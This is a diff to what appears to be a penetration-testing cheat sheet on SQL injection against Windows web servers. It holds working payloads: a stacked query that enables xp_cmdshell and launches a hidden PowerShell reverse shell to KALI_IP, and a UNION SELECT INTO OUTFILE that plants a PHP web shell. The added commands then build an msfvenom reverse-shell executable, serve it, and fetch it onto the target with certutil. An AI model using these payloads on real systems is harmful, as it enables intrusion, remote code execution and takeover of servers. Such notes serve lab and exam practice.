@@ -229,6 +229,31 @@ admin' UNION SELECT 1, is_srvrolemember('sysadmin')-- -
 ```
 ' UNION SELECT 1, 2, 3; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell 'powershell -NoP -NonI -W Hidden -Exec Bypass -Command "New-Object System.Net.Sockets.TCPClient('KALI_IP',4444)...'-- -
 ```
+Route RCE as well:
+```
+' UNION SELECT ("<?php echo passthru($_GET['cmd']);") INTO OUTFILE 'C:/xampp/htdocs/cmd.php'  -- -'
+```
+Encountering it:
+```
+http://$target:<port>/diretc?URL=%27+UNION+SELECT+%28%22%3C%3Fphp+echo+passthru%28%24_GET%5B%27cmd%27%5D%29%3B%22%29+INTO+OUTFILE+%27C%3A%2Fxampp%2Fhtdocs%2Fcmd.php%27++--+-%27
+```
+Curl the site
+```
+ curl "http://$target:<port>/cmd.php?cmd=dir"
+```
+```
+msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=port -f exe -o reverse.exe
+```
+```
+python3 -m http.server 80
+```
+```
+curl "http://$target:port/cmd.php?cmd=certutil+-f+-urlcache+http://<IP>:/reverse.exe+reverse.exe"
+```
+Set up a listener on the port you want to use with NC and curl the file you uploaded
+```
+curl "http://$target:port/cmd.php?cmd=certutil+-f+-urlcache+http://<IP>:/reverse.exe+reverse.exe"
+```
 ## Great tools:
 https://github.com/squid22/PostgreSQL_RCE --> PostgreSQL RCE is already there, just change the ip address and port
 
